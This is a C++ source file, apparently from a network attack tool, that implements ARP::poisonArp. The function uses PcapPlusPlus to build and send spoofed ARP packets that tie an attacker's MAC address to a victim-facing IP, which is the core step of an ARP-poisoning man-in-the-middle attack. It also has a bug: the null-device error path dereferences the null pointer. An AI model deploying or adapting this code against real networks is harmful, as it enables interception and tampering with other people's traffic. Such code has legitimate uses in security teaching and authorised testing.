#include "arp_poisoning/arp_poisoning.h"
#include "IpAddress.h"
#include "MacAddress.h"
#include "PcapLiveDeviceList.h"
#include "arp_poisoning/create_packet.h"

/**
 * Send a single arp poisoning packet.
 *
 * @param options strings containing mac and arp adresses
 * @throws invalid_argument if device is invalid
 * @throws invalid_argumnet if ip adresses are malformed
 * @throws invalid_argument if mac adresses are malformed
 * @throws runtime_exception if construction of packet fails
 * @throws runtime_exception if sending of packet fails
 */
void ARP::poisonArp(ArpPoisoningOptions &options) {
    pcpp::MacAddress macAttacker(options.macAttacker);
    pcpp::IPv4Address ipAttacker(options.ipAttacker);

    pcpp::MacAddress macVictim(options.macVictim);
    pcpp::IPv4Address ipVictim(options.ipVictim);

    pcpp::IPv4Address ipToSpoof(options.ipToSpoof);

    // Open interface
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(
            options.deviceName);

    ARP::ArpPoisoningPacketPayload payload{ipAttacker, macAttacker, ipVictim,
                                           macVictim, ipToSpoof};

    pcpp::Packet packet = ARP::createPacket(payload);

    if (device == nullptr || !device->open()) {
        std::string msg =
            std::string("Unable to open interface ") + device->getName() + "\n";
        throw std::invalid_argument(msg);
    }

    if (!device->sendPacket(&packet)) {
        device->close();
        throw std::runtime_error("Failed to send packet" + packet.toString());
    };

    device->close();
}
